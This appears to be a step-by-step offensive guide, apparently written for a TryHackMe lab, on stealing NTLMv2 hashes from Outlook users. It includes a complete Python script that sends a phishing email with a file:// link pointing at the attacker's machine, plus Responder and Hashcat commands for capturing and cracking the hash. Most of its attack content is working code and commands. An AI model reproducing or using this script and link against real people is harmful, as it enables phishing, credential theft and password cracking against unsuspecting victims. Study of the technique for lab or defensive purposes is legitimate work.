# Capturing NTLMv2 Hash via Outlook SMB Request

This guide shows how to use Outlook and SMB protocol to capture an NTLMv2 hash from a victim's machine by sending a specially crafted email and using the Responder tool to intercept the hash.

## 🔧 1. What You Need

To perform this technique, you need:

| Component           | Description                                                                                  |
|---------------------|----------------------------------------------------------------------------------------------|
| **Attacker Machine** | Your Kali Linux (or THM AttackBox) where the attack is executed.                             |
| **Victim Machine**   | Windows PC running Outlook (can use VM for testing).                                        |
| **Local IP**         | Attacker machine’s IP address on the network (e.g., `192.168.1.10`).                        |
| **SMTP Server**      | Server that sends the email – you must know the address, port, and login credentials.       |
| **Responder Tool**   | Tool that listens for SMB requests and captures NTLM hashes.                                |

# 💡 2. Explanation of Basic Concepts

### 📬 What is an SMTP Server?

SMTP = Simple Mail Transfer Protocol  
It is the server responsible for sending emails from one account to another.

When sending emails via a Python script, you must specify the SMTP server used –  
for example, Gmail uses `smtp.gmail.com`, Outlook uses `smtp.office365.com`, etc.

In labs like TryHackMe, you often use a fake SMTP server that is already set up (e.g., `10.10.143.109`).

# 🌍 3. How to Find Your Attacker Machine’s IP Address

On Kali Linux (or any Linux), run this command in the terminal:

```bash
ip a
```
Look for the line containing inet 192.168.x.x or 10.10.x.x – that is your local IP address.

# 💣 4. How Does It Work?
🎯 Goal:
Make Outlook automatically send the NTLMv2 hash to your machine.

🧠 Mechanism:
Outlook opens file:// links (network file links).

When you click on this link in the email:

<a href="file://192.168.1.10/test!exploit">Click me</a>
Outlook:

tries to load the file

sends an SMB authentication request including the NTLM hash

On your side, Responder listens and captures the hash.

# ✅ 5. Step-by-step from Zero (Example with a Fake SMTP Server)
🖥️ On Kali Linux (Attacker)
Find your IP
```
ip a
```
Note it down, e.g., 192.168.1.10.

Start Responder
```
sudo responder -I eth0
```
(replace eth0 with your network interface name)

Create the exploit.py script:
```
nano exploit.py
```
Paste the following Python code:

# ⬇️⬇️ Don't forget to change what is needed. ⬇️⬇️

```bash
 import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@example.com'
receiver_email = 'victim@example.com'
password = 'attacker'  # only if SMTP requires authentication⬅️⬅️

html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://192.168.1.10/test!exploit">Click me</a></p>⬅️⬅️⬅
</html>"""

message = MIMEMultipart()
message['Subject'] = "Check this out!"
message["From"] = formataddr(('Hacker', sender_email))
message["To"] = receiver_email

msgHtml = MIMEText(html_content, 'html')
message.attach(msgHtml)

server = smtplib.SMTP('10.10.143.109', 25)  # ← change this if you need another server ⬅️⬅️
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\nEmail delivered")
except Exception as error:
    print(error)
finally:
    server.quit()

```

#### Run the script:
```
python3 exploit.py
```
If successful, you will see:


📧 Email delivered

💻 On the Windows Machine (Victim)
 Open Outlook
 Open the received email

 Click the #"Click me"# link

Outlook will try to open the SMB link → sending the NTLM hash.

🔐 Where to See the Hash?
Responder terminal will automatically display a line like this:

## [SMB] NTLMv2-Hash captured from VICTIM
🛠️ (Optional) Crack the Hash
Copy the hash into a file called hash.txt and then use Hashcat:
 ```
hashcat -m 5600 hash.txt rockyou.txt --force
```
